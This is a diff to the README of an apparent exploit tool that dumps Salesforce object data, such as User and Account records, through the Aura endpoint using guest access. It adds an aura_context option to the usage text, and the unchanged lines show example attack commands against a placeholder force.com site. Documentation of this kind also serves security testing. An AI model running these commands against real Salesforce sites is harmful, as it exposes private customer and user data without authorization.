@@ -10,6 +10,7 @@ This tool dumps the data of Salesforce object through Aura lightning endpoint wi
 ```
 $ python exploit.py -h
 usage: exploit.py [-h] -u URL [-o [OBJECTS [OBJECTS ...]]] [-l] [-c]
+                  [-a AURA_CONTEXT]
 
 Exploit Salesforce through the aura endpoint with the guest privilege
 
@@ -25,6 +26,8 @@ optional arguments:
                         ion
   -l, --listobj         pull the custom object list.
   -c, --check           only check aura endpoint
+  -a AURA_CONTEXT, --aura_context AURA_CONTEXT
+                        set your valid aura_context
 
 $ python exploit.y -u https://domain.force.com/sitepath -l
 $ python exploit.y -u https://domain.force.com/sitepath -o User Account
